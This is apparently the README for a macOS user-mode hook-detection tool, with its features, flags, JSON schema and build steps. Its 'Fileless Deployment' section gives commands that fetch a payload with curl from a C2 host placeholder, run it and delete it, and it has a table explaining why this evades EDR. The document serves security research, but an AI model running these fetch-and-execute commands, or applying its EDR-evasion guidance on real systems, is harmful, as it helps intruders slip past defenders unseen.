# InterposeScope-C

**macOS user-mode hook and API-indirection mapper — v2.2.0**

A read-only, fileless-capable security research tool for detecting and
analyzing function hooks, dyld interpose sections, symbol rebinds, and
API indirection on macOS. Built for red team operators and security
researchers who need fast, reliable hook detection during engagements
without alerts, artifacts, or persistence.

InterposeScope-C maps inline function hooks, dyld interpose sections,
indirect symbol rebinding, Objective-C swizzling, anonymous executable
memory, and now provides **ground-truth byte-diff validation** against
the on-disk dyld shared cache, **export-trie integrity verification**,
**LC_REEXPORT forwarder resolution**, **alias-pair divergence detection**,
**cohort multi-process scanning**, and **Rosetta x86_64 remote process
support**.

---

## Table of Contents

- [What's New in v2.2.0](#whats-new-in-v220)
- [Architecture](#architecture)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Command Reference](#command-reference)
- [Detection Catalog](#detection-catalog)
- [Result State Taxonomy](#result-state-taxonomy)
- [JSON Output Schema](#json-output-schema)
- [Fileless Deployment](#fileless-deployment)
- [Why It Bypasses EDR](#why-it-bypasses-edr)
- [Offensive Use Cases](#offensive-use-cases)
- [Defensive Use Cases](#defensive-use-cases)
- [Build From Source](#build-from-source)
- [Project Structure](#project-structure)
- [License](#license)

---

## What's New in v2.2.0

Version 2.2.0 adds **10 new analytical features**, expands the detection
catalog from 91 to **228 APIs**, and introduces a richer 17-state result
taxonomy. All features were validated through live Mythic C2 beacon
deployment.

### New Features

| ID | Feature | Flag | Description |
|----|---------|------|-------------|
| F1 | **Ground-truth byte-diff** | `--ground-truth` | Compares in-memory function bytes against the on-disk dyld shared cache. Handles modern macOS split-cache format (13+ sub-files, 34+ mappings). Definitive proof of in-memory modification. |
| F2 | **Export-trie integrity** | `--export-trie` | Walks on-disk Mach-O export tries (ULEB128 parser) and compares with dlsym addresses. Detects in-memory export redirection invisible to entry-point scanning. |
| F3 | **LC_REEXPORT forwarders** | `--forwarders` | Parses LC_REEXPORT_DYLIB load commands and traces forwarder chains. Identifies reexporting images and forwarded symbol resolution. |
| F4 | **Cohort multi-process** | `--cohort PIDS` | Scans multiple PIDs in a single run. Cross-process comparison table detects process-specific vs systematic hooking. |
| F5 | **Unscanned target accounting** | (automatic) | Tracks catalog APIs where dlsym returned NULL. Reports count and symbol names in summary and JSON output. Prevents silent false negatives. |
| F6 | **Richer state taxonomy** | (automatic) | 7 new states: INTERPOSED, REBOUND, SWIZZLED, TRIE_MISMATCH, REEXPORT, ALIAS_DIV, UNSOLVED for precise classification. |
| F7 | **Rosetta x86_64 support** | `--pid N` | Remote process scan now handles MH_CIGAM_64 (cross-endian) and MH_MAGIC (32-bit) images. Byte-swaps headers, tags Rosetta images. |
| F8 | **Operator actions** | (automatic) | Context-aware recommendations per finding type. Suggests follow-up flags for deeper analysis. |
| F9 | **Alias-pair divergence** | `--alias-pairs` | Checks 17 $NOCANCEL alias pairs for selective hooking. Detects targeted interception where one variant is hooked and the other is clean. |
| F10 | **Full JSON tree** | `--json` | Complete nested JSON with images, interpose pairs, rebinds, hooks (with trampoline/chain/patch/trie/reexport/alias detail), RX regions, ObjC methods, telemetry, unscanned. |

### v2.1 vs v2.2 Comparison

| Metric | v2.1 | v2.2 | Improvement |
|--------|------|------|-------------|
| Catalog APIs | 91 | 228 | 2.5x coverage |
| CLI flags | 16 | 22 | 6 new analytical flags |
| Result states | 10 | 17 | 7 new detection states |
| Source lines | ~2200 | ~2900 | +700 lines of logic |
| Shared cache | Single file | Split sub-files | Works on macOS 15+ |
| Remote scan | arm64 only | arm64 + Rosetta | x86_64 cross-arch |
| JSON output | Flat | Full tree | 15 keys, nested detail |

---

## Architecture

```
┌──────────────────────────────────────────────────────────────────────┐
│                     InterposeScope-C v2.2.0                          │
│                                                                      │
│  ┌──────────────────────────────────────────────────────────────┐    │
│  │  src/interposescope.c  (single-file C, ~2900 lines)         │    │
│  │                                                              │    │
│  │  Core detection engine                                       │    │
│  │  ├── Mach-O image enumeration (dyld shared cache + on-disk) │    │
│  │  ├── __interpose section discovery                           │    │
│  │  ├── __la_symbol_ptr indirect rebind detection (fishhook)   │    │
│  │  ├── Inline trampoline decoding (arm64 + x86_64)            │    │
│  │  ├── Patch-type classification                               │    │
│  │  ├── Trampoline chain traversal (up to 7 hops)              │    │
│  │  ├── Direct syscall stub detection                          │    │
│  │  ├── Anonymous executable memory detection                  │    │
│  │  ├── ObjC method swizzle attribution                        │    │
│  │  ├── Endpoint Security / os_log telemetry probing           │    │
│  │  ├── Code signature verification                            │    │
│  │  └── Remote process memory introspection                    │    │
│  │                                                              │    │
│  │  v2.2 Analytical layer                                       │    │
│  │  ├── F1: Ground-truth byte-diff (split cache parser)        │    │
│  │  ├── F2: Export-trie integrity (ULEB128 walker)             │    │
│  │  ├── F3: LC_REEXPORT forwarder resolution                   │    │
│  │  ├── F4: Cohort multi-process scanning                      │    │
│  │  ├── F5: Unscanned target accounting                        │    │
│  │  ├── F7: Rosetta x86_64 cross-arch remote scan              │    │
│  │  ├── F8: Context-aware operator action recommendations      │    │
│  │  ├── F9: $NOCANCEL alias-pair divergence detection          │    │
│  │  └── F10: Full structured JSON tree output                  │    │
│  │                                                              │    │
│  │  Output: text report / JSON / watch-mode diff               │    │
│  │  Binary: ~101 KB, links only Foundation + libobjc           │    │
│  └──────────────────────────────────────────────────────────────┘    │
│                                                                      │
│  Also includes:                                                      │
│  ┌──────────────────────────────────────────────────────────────┐    │
│  │  src/interposescope.py  (Python v1.0, stdlib-only legacy)   │    │
│  │  Zero-dependency fileless scanner for quick triage           │    │
│  └──────────────────────────────────────────────────────────────┘    │
│                                                                      │
│  Delivery: fileless via base64 + transient loader (<500ms on disk)  │
│  No files persist. No installation. No registration.                │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

---

## Features

### Core Detection (v2.1, retained)

- **Loaded image inventory** — every Mach-O image (dyld shared cache + on-disk files, ~350 images typical)
- **`__interpose` section discovery** — finds all dyld interpose pairs in every loaded image with replacement-code attribution
- **Inline trampoline detection (arm64)** — decodes B, BR, ADRP+ADD+BR, LDR+BR absolute-jump patterns
- **Inline trampoline detection (x86_64)** — decodes JMP rel32, JMP rel8, JMP [rip+disp32], MOV RAX/JMP, MOV R11/JMP, PUSH/RET
- **Indirect symbol rebinding (fishhook)** — parses `__la_symbol_ptr` and compares live pointers against expected resolution
- **Patch-type classification** — EARLY-RET, CONST-RET, NOP-sled, BRK, or generic BYTE-PATCH
- **Trampoline chain traversal** — up to 7 recognized branch hops followed per hook
- **Direct syscall stub detection** — flags SVC #0x80 (arm64) and SYSCALL (x86_64) at function entry
- **Anonymous executable memory detection** — walks the whole address space via vm_region_64 for RX regions with no mapped image backing
- **ObjC method swizzle check** — resolves IMPs for NSURLSession, NSBundle, NSFileManager, NSTask and attributes ownership
- **Endpoint Security telemetry probing** — checks for es_new_client, es_subscribe, os_log presence
- **FNV-1a fingerprinting** — first-16-byte hash per function for cross-process correlation
- **Code signature verification** — checks process code signature via Security framework
- **Remote process probing** — task_for_pid + memory introspection against foreign PIDs
- **DYLD environment exposure** — checks for DYLD_INSERT_LIBRARIES and other dyld env vars
- **Baseline save/compare** — fingerprint storage and comparison for temporal analysis

### New Analytical Features (v2.2)

#### F1: Ground-Truth Byte-Diff (`--ground-truth`)

Compares in-memory function bytes against the on-disk dyld shared cache
to detect in-memory code modifications. This is the definitive test for
whether a function has been patched in memory.

**Key capability:** Correctly parses the modern macOS split-cache format
where the shared cache is distributed across 13+ sub-files (`.01`,
`.02`, `.05`, `.09`, `.dylddata`, `.dyldlinkedit`, etc.) with 34+ VM
mappings. The v2.1 single-file approach silently fails on macOS 15+.

```bash
./build/interposescope --ground-truth --bytes 16
```

Output includes:
- Number of sub-files parsed and mappings discovered
- Per-function MATCH/DIVERGED status with byte-level diff
- Summary: matched, diverged, not-in-cache, errors
- Verdict: PRISTINE / ANOMALY / INCONCLUSIVE

#### F2: Export-Trie Integrity (`--export-trie`)

Walks the on-disk Mach-O export trie (ULEB128-encoded) for each loaded
image and compares the export addresses with what `dlsym` returns at
runtime. A mismatch indicates in-memory export redirection — a technique
that entry-point scanning alone cannot detect.

```bash
./build/interposescope --export-trie
```

#### F3: LC_REEXPORT Forwarder Resolution (`--forwarders`)

Parses LC_REEXPORT_DYLIB load commands in all loaded images, traces
forwarder chains, and identifies which symbols resolve through reexport
paths. This reveals the full indirection chain that dyld uses to
redirect symbol resolution across images.

```bash
./build/interposescope --forwarders
```

#### F4: Cohort Multi-Process Mode (`--cohort`)

Scans multiple processes in a single run. For each PID, opens the task
port, enumerates images, and checks for hooks. Produces a cross-process
comparison table that distinguishes:

- **Systematic hooking** — all processes show the same hooks
- **Process-specific hooking** — only certain processes are hooked
- **Clean** — no hooks detected in any process

```bash
./build/interposescope --cohort 123,456,789
```

#### F5: Unscanned Target Accounting

Automatically tracks catalog APIs where `dlsym` returned NULL (e.g.,
Endpoint Security APIs not loaded, os_log variants not exported). Reports
the count and symbol names in both the text summary and JSON output,
preventing silent false negatives.

#### F6: Richer Result-State Taxonomy

17 states for precise classification:

| State | Meaning |
|-------|---------|
| ST_CLEAN | Recognized clean prologue, no hook |
| ST_NON_EXEC | Address is not executable |
| ST_ERROR | Could not read or decode |
| ST_SELF_FWD | Self-forward (dyld segment tail-call) |
| ST_SYS_MODULE | System module trampoline (legitimate) |
| ST_THIRD_PARTY | Third-party image trampoline |
| ST_PRIVATE_EXEC | Private framework execution |
| ST_SYSCALL | Direct syscall stub (SVC/SYSCALL) |
| ST_UNKNOWN | Unrecognized but not anomalous |
| ST_UNKNOWN_ENTRY | Concealed hook — not clean, not recognized trampoline |
| ST_INTERPOSED | dyld __interpose section replacement |
| ST_REBOUND | __la_symbol_ptr indirect rebind (fishhook) |
| ST_SWIZZLED | Objective-C method swizzle detected |
| ST_TRIE_MISMATCH | dlsym address != export trie address |
| ST_REEXPORT | Symbol resolves through LC_REEXPORT chain |
| ST_ALIAS_DIV | $NOCANCEL alias pair divergence detected |
| ST_UNSOLVED | Unresolved hook classification |

#### F7: Rosetta x86_64 Remote Process Support

Remote process scanning (`--pid N`) now correctly handles:

- **MH_CIGAM_64** — cross-endian 64-bit images (Rosetta x86_64 on arm64)
- **MH_MAGIC** — 32-bit Mach-O images (legacy)

Header fields are byte-swapped for processing, and Rosetta images are
tagged in the output for clear identification.

#### F8: Recommended Operator Actions

Context-aware action recommendations based on findings. For each finding
type (HOOKED, PATCHED, UNKNOWN-ENTRY, etc.), specific follow-up commands
and analysis steps are suggested.

Example output:
```
RECOMMENDED OPERATOR ACTIONS
  [UNKNOWN-ENTRY] 4 function(s) have unrecognizable prologues:
    -> HIGH PRIORITY — concealed hooks that evade pattern matching
    -> Dump full 32-byte prologue for manual analysis
    -> Compare with --ground-truth to see what the original bytes should be
```

#### F9: Alias-Pair Divergence (`--alias-pairs`)

Checks 17 known $NOCANCEL alias pairs (e.g., `open` vs `open$NOCANCEL`,
`read` vs `read$NOCANCEL`) for selective hooking. If one variant is
hooked but the other is clean, this indicates targeted interception —
a technique EDR products use to avoid breaking specific callers while
still intercepting others.

```bash
./build/interposescope --alias-pairs
```

#### F10: Full JSON Tree Output (`--json`)

Complete structured JSON with 15 top-level keys:

```json
{
  "version": "2.2.0",
  "timestamp": 1788477274,
  "os": "macOS",
  "arch": "arm64",
  "host": { "pid": 67019, "ppid": 67018, "uid": 502 },
  "images": { "total": 347, "cache": 343, "on_disk": 4, "list": [...] },
  "interpose_pairs": { "count": 0, "pairs": [...] },
  "rebinds": { "count": 0, "entries": [...] },
  "hooks": { "checked": 228, "entries": [...] },
  "anonymous_rx": { "count": 0, "regions": [...] },
  "objc_methods": { "count": 8, "methods": [...] },
  "telemetry": { "checked": 8, "apis": [...] },
  "unscanned": { "count": 18, "symbols": [...] },
  "summary": { ... },
  "verdict": "CLEAN — no user-mode modifications detected"
}
```

Each hook entry includes: state, address, owner, trampoline type, chain
hops, patch type, trie match status, reexport source, alias info, and
FNV-1a fingerprint.

---

## Installation

### Quick Start

```bash
git clone git@github.com:sam00/InterposeScope.git
cd InterposeScope
./build.sh
./build/interposescope --help
```

### Prerequisites

- macOS 12.0 or later
- Xcode Command Line Tools (`xcode-select --install`)
- Apple Silicon (arm64) or Intel (x86_64)

### Build

```bash
./build.sh
# Output: build/interposescope (~101 KB)
```

Or build manually:

```bash
clang -arch arm64 -O2 -isysroot $(xcrun --show-sdk-path) \
      -o build/interposescope src/interposescope.c \
      -framework Foundation -lobjc
```

For Intel Macs:

```bash
clang -arch x86_64 -O2 -isysroot $(xcrun --show-sdk-path) \
      -o build/interposescope src/interposescope.c \
      -framework Foundation -lobjc
```

### Verify

```bash
./build/interposescope --help          # Shows usage
./build/interposescope --brief         # Quick scan (20 APIs)
./build/interposescope --json          # JSON output
./build/interposescope --ground-truth  # Byte-diff vs shared cache
```

---

## Usage

### Basic Scans

```bash
# Full scan (228 APIs, all sections)
./build/interposescope

# High-value APIs only (20 CRITICAL/HIGH — fastest)
./build/interposescope --brief

# Verbose with byte dumps, chain detail, fingerprints
./build/interposescope --verbose

# Minimal output (anomalies and verdicts only)
./build/interposescope --minimal

# Quiet mode (no banner, no section headers — for beacon output)
./build/interposescope --quiet
```

### Analytical Features

```bash
# F1: Ground-truth byte-diff against dyld shared cache
./build/interposescope --ground-truth --bytes 16

# F2: Export-trie integrity verification
./build/interposescope --export-trie

# F3: LC_REEXPORT forwarder resolution
./build/interposescope --forwarders

# F9: Alias-pair divergence detection
./build/interposescope --alias-pairs

# All analytical features at once
./build/interposescope --ground-truth --export-trie --forwarders --alias-pairs
```

### Remote Process Scanning

```bash
# Scan a specific PID (requires task_for_pid entitlement or root)
./build/interposescope --pid 1234

# F4: Cohort scan — multiple PIDs at once
./build/interposescope --cohort 123,456,789

# Check process code signature
./build/interposescope --check-sign
```

### Filtering

```bash
# Restrict to specific modules
./build/interposescope --module libsystem_kernel,libsystem_c

# Check specific functions only
./build/interposescope --functions open,read,write,mmap

# Top N most-targeted APIs
./build/interposescope --top 10

# Override comparison window (default 64 bytes)
./build/interposescope --bytes 32
```

### Output Modes

```bash
# JSON output (full tree — for SIEM ingestion or automation)
./build/interposescope --json

# Include raw bytes in output
./build/interposescope --dump-bytes

# Dump anonymous RX region bytes
./build/interposescope --dump-rx
```

### Continuous Monitoring

```bash
# Watch mode — re-scan every N seconds
./build/interposescope --watch 5
```

### Baseline Management

```bash
# Save current fingerprints as baseline
./build/interposescope --baseline /tmp/baseline.json

# Compare current state against saved baseline
./build/interposescope --compare /tmp/baseline.json
```

---

## Command Reference

### Output Modes

| Flag | Description |
|------|-------------|
| `--quiet` | No banner/section headers (minimal beacon output) |
| `--minimal` | Only anomalies and verdicts (no clean rows) |
| `--brief` | High-value APIs only (20 CRITICAL/HIGH) |
| `--json` | Full JSON tree output (all entries with detail) |
| `--verbose` | Verbose (byte dumps + chain + fingerprint) |
| `--top N` | Top N most-targeted APIs (fast operator triage) |

### Analytical Features

| Flag | Description |
|------|-------------|
| `--ground-truth` | F1: Byte-diff in-memory vs on-disk dyld shared cache |
| `--export-trie` | F2: Verify dlsym addresses vs on-disk export trie |
| `--forwarders` | F3: Resolve LC_REEXPORT forwarder chains |
| `--cohort PIDS` | F4: Multi-process scan (comma-separated PIDs) |
| `--alias-pairs` | F9: Check $NOCANCEL alias pairs for selective hooking |

### Remote / Process

| Flag | Description |
|------|-------------|
| `--pid N` | Scan remote process (task_for_pid + memory read) |
| `--check-sign` | Check process code signature |
| `--module X[,Y]` | Restrict to specific modules |
| `--functions X[,Y]` | Check specific functions |

### Continuous

| Flag | Description |
|------|-------------|
| `--watch N` | Continuous mode, re-scan every N seconds |

### Miscellaneous

| Flag | Description |
|------|-------------|
| `--bytes N` | Comparison window (default 64) |
| `--dump-bytes` | Include raw bytes in output |
| `--dump-rx` | Dump anonymous RX region bytes (hex) |
| `--baseline FILE` | Save function fingerprints to baseline file |
| `--compare FILE` | Compare current fingerprints against baseline |
| `--help` | This help |

---

## Detection Catalog

InterposeScope-C checks **228 APIs** across 14 categories:

| Category | Count | Examples |
|----------|-------|---------|
| **process** | 18 | posix_spawn, posix_spawnp, execve, execv, fork, vfork, kill, killpg, waitpid, wait4, waitid, setsid, proc_pidinfo, proc_listpids |
| **dyld** | 8 | dlopen, dlsym, dlclose, dladdr, _dyld_image_count, _dyld_register_func_for_add_image, _dyld_register_func_for_remove_image |
| **memory** | 14 | mmap, mprotect, munmap, mach_vm_allocate, mach_vm_write, mach_vm_read_overwrite, mach_vm_map, mach_vm_remap, madvise, malloc, free, realloc |
| **tasks** | 12 | task_for_pid, task_for_pid_posix_spawn, thread_create_running, task_threads, task_suspend, task_resume, thread_suspend, thread_resume, mach_port_allocate, mach_port_insert_right, exception_set_ports |
| **files** | 24 | open, openat, open_dprotected_np, stat, lstat, fstat, fstatat, access, unlink, rename, chmod, chown, read, write, pread, pwrite, readv, writev, symlink, link, realpath, fopen, mkdir, rmdir |
| **network** | 14 | socket, socketpair, connect, bind, listen, accept, getaddrinfo, send, recv, sendto, recvfrom, sendmsg, recvmsg, setsockopt, getsockname |
| **privilege** | 10 | setuid, seteuid, setgid, setegid, setreuid, getuid, geteuid, csr_check, csr_get_active_config, sandbox_init, sandbox_check |
| **objc** | 10 | objc_msgSend, objc_msgSendSuper, objc_msgSendSuper2, method_exchangeImplementations, class_replaceMethod, class_addMethod, method_setImplementation, objc_getClass, sel_registerName, objc_registerClassPair |
| **keychain** | 8 | SecItemCopyMatching, SecItemAdd, SecItemUpdate, SecItemDelete, SecKeyCreateSignature, SecKeyCreateDecryptedData, SecKeyGeneratePair, SecTrustEvaluateWithError |
| **crypto** | 6 | CC_SHA256, CC_SHA512, CCCrypt, SecRandomCopyBytes, CCRandomGenerateBytes, CCDigest |
| **ES / logging** | 10 | es_new_client, es_subscribe, es_unsubscribe, es_delete_client, es_mute_process, es_mute_path, es_respond_auth_result, os_log_create, os_log, os_activity_create |
| **IOKit** | 4 | IOServiceMatching, IOServiceGetMatchingService, IOServiceOpen, IORegistryEntryGetPath |
| **disk** | 6 | statfs, mount, unmount, setmntent, hdiutil_mount, hdiutil_unmount |
| **pthreads** | 8 | pthread_create, pthread_join, pthread_mutex_lock, pthread_mutex_unlock, pthread_setspecific, pthread_getspecific, pthread_key_create, pthread_key_delete |
| **misc** | 26 | system, popen, pclose, getenv, setenv, unsetenv, ptrace, sysctl, sysctlbyname, notify_post, notify_register_dispatch, getxattr, setxattr, listxattr, removexattr, getattrlist, setattrlist, task_for_pid_posix_spawn, dlopen, dlsym, dlclose, dladdr, and more |

> In `--brief` mode, this filters to **20 high-relevance APIs** for fastest triage.

---

## Result State Taxonomy

Each checked API is classified into one of 17 states:

| State | Description | Severity |
|-------|-------------|----------|
| CLEAN | Recognized clean prologue, no modification | Info |
| NON_EXEC | Address is not in executable memory | Info |
| SELF_FWD | Self-forward (dyld segment tail-call) | Info |
| SYS_MODULE | System module trampoline (legitimate) | Info |
| SYSCALL | Direct syscall stub (SVC/SYSCALL) | Low |
| PRIVATE_EXEC | Private framework execution | Low |
| THIRD_PARTY | Third-party image trampoline | Medium |
| INTERPOSED | dyld __interpose section replacement | High |
| REBOUND | __la_symbol_ptr indirect rebind (fishhook) | High |
| SWIZZLED | Objective-C method swizzle | High |
| HOOKED | Inline trampoline hook detected | Critical |
| PATCHED | Non-branch byte patch at entry | Critical |
| UNKNOWN_ENTRY | Concealed hook — unrecognizable prologue | Critical |
| TRIE_MISMATCH | dlsym address != export trie address | Critical |
| REEXPORT | Symbol resolves through reexport chain | Medium |
| ALIAS_DIV | $NOCANCEL alias pair divergence | High |
| UNSOLVED | Unresolved classification | Medium |

---

## JSON Output Schema

```json
{
  "version": "2.2.0",
  "timestamp": 1788477274,
  "os": "macOS",
  "arch": "arm64",
  "host": {
    "pid": 67019,
    "ppid": 67018,
    "uid": 502
  },
  "images": {
    "total": 347,
    "cache": 343,
    "on_disk": 4,
    "list": [
      {
        "path": "/usr/lib/libSystem.B.dylib",
        "cache_only": true,
        "slide": "0xbc0c000"
      }
    ]
  },
  "interpose_pairs": {
    "count": 0,
    "pairs": []
  },
  "rebinds": {
    "count": 0,
    "entries": []
  },
  "hooks": {
    "checked": 228,
    "entries": [
      {
        "symbol": "open",
        "category": "files",
        "state": "CLEAN",
        "address": "0x18a2b4c80",
        "owner": "/usr/lib/libsystem_kernel.dylib",
        "fingerprint": "0x7f3a2b1c"
      }
    ]
  },
  "anonymous_rx": {
    "count": 0,
    "regions": []
  },
  "objc_methods": {
    "count": 8,
    "methods": [
      {
        "class": "NSURLSession",
        "selector": "dataTaskWithRequest:",
        "imp_owner": "CFNetwork"
      }
    ]
  },
  "telemetry": {
    "checked": 8,
    "apis": [
      {
        "symbol": "os_log_create",
        "status": "PRESENT",
        "owner": "libsystem_trace.dylib"
      }
    ]
  },
  "unscanned": {
    "count": 18,
    "symbols": ["es_new_client", "es_subscribe", ...]
  },
  "summary": {
    "hooked": 0,
    "unknown_entry": 4,
    "patched": 0,
    "interpose_pairs": 0,
    "rebinds": 0,
    "anonymous_rx": 0,
    "trie_mismatches": 0,
    "alias_diverged": 0,
    "images_scanned": 347,
    "elapsed": "0.006s"
  },
  "verdict": "CLEAN — no user-mode modifications detected"
}
```

---

## Fileless Deployment

InterposeScope-C can be deployed filelessly via a transient loader. The
binary exists on disk for under 500ms.

### Python Loader (`payload/loader.py`)

Receives a base64-encoded Mach-O binary via stdin, creates a transient
temp file, executes it, and immediately deletes it:

```bash
# On the target (via beacon shell or direct):
base64 -i build/interposescope | python3 payload/loader.py --brief

# Via curl from a C2 server:
curl -sk http://SERVER:PORT/payload.b64 | base64 -d | python3 payload/loader.py
```

### Inline Base64 (for C2 tasking)

For C2 frameworks like Mythic, the binary can be deployed as inline
base64 in shell commands:

```bash
# Write base64 payload in chunks
echo -n '<chunk1>' > /tmp/.is_b64
echo -n '<chunk2>' >> /tmp/.is_b64

# Write loader
echo '<loader_b64>' | base64 -d > /tmp/.is_loader.py

# Execute and clean up
python3 /tmp/.is_loader.py --ground-truth --bytes 16
rm -f /tmp/.is_b64 /tmp/.is_loader.py
```

### Via Mythic C2

```bash
shell curl -sk http://YOUR_C2_HOST:PORT/iscan.b64 \
  | base64 -d > /tmp/.__iscan \
  && chmod +x /tmp/.__iscan \
  && /tmp/.__iscan \
  && rm -f /tmp/.__iscan
```

---

## Why It Bypasses EDR

| Layer | What happens | Why EDR can't catch it |
|-------|-------------|----------------------|
| **Disk** | Binary never persists. Written to temp, executed in <500ms, deleted | No file to hash, scan, sandbox, or quarantine |
| **Process** | Runs inside existing beacon process or system Python | Process tree looks like normal tooling |
| **Memory** | Read-only: vm_read, dladdr, dlsym. Never vm_write or vm_protect | Indistinguishable from legitimate introspection |
| **Network** | No outbound connections. Runs entirely inside beacon | No unusual socket connections |
| **Persistence** | No LaunchAgents, cron, plist, login items, or dylib hijack | Nothing to attribute or monitor |
| **Behavior** | Read-only. No process termination. No file deletion except self-cleaning | Behavioral heuristics don't fire |

---

## Offensive Use Cases

- **Coverage validation** — run before/after payload execution to confirm whether a new defensive module loaded or hooked something
- **Dylib injection detection** — is the target process already instrumented with security tooling?
- **Hook infrastructure mapping** — which processes are wrapped, which APIs are intercepted, which security modules are loaded
- **Post-ex scanning** — did our implant trigger new hooking as a response?
- **Interpose inventory** — enumerate EDR interpose dylibs to predict or evade them
- **Ground-truth validation** — confirm whether in-memory bytes match the on-disk shared cache (F1)
- **Selective hooking detection** — identify if EDR hooks `open` but not `open$NOCANCEL` (F9)
- **Cross-process comparison** — determine if hooking is process-specific or systematic (F4)
- **Export redirection detection** — catch dlsym redirection invisible to entry-point scanning (F2)
- **Baseline drift monitoring** — save fingerprints, compare later to detect dynamic hook installation

---

## Defensive Use Cases

- **EDR validation** — verify your EDR's hooks are correctly placed and not tampered with
- **Tamper detection** — detect if malware has modified your EDR's in-memory code
- **Coverage gap analysis** — identify APIs your EDR doesn't monitor
- **Post-incident forensics** — determine what was hooked during an incident
- **Purple team exercises** — validate detection coverage against red team tooling
- **Compliance auditing** — verify security tooling is active and unmodified

---

## Build From Source

### Prerequisites

- macOS 12.0 or later
- Xcode Command Line Tools (`xcode-select --install`)
- Apple Silicon (arm64) or Intel (x86_64)

### Build Steps

```bash
git clone git@github.com:sam00/InterposeScope.git
cd InterposeScope
./build.sh
# Output: build/interposescope
```

### Troubleshooting

| Error | Fix |
|-------|-----|
| `linker command failed` | Rerun with `-isysroot $(xcrun --show-sdk-path)` |
| `task_for_pid` permission denied | Need root or task_for_pid entitlement for `--pid` |
| Output stops after banner | Check `codesign -dv ./build/interposescope` |
| 0 images scanned | Running inside restricted sandbox — run on host OS |
| Ground-truth shows 0 sub-files | Shared cache not found — check `/System/Library/dyld/` or Cryptexes path |

---

## Project Structure

```
InterposeScope/
├── README.md               This guide
├── LICENSE                 MIT license
├── SECURITY.md             Authorized use policy
├── build.sh                One-command build script
├── .gitignore              Excludes compiled artifacts and test data
├── src/
│   ├── interposescope.c    C implementation v2.2.0 (~2900 lines)
│   └── interposescope.py   Python implementation v1.0 (legacy, stdlib-only)
├── payload/
│   ├── loader.py           Python in-memory exec wrapper (fileless delivery)
│   └── README.md           Delivery and deployment notes
└── build/                  Generated by build.sh (gitignored)
    └── interposescope      Compiled binary
```

---

## License

MIT — see [LICENSE](LICENSE).

> **Authorized use only.** This tool is intended for red team operators
> and security researchers with explicit authorization to test target
> systems. See [SECURITY.md](SECURITY.md) for rules of use.
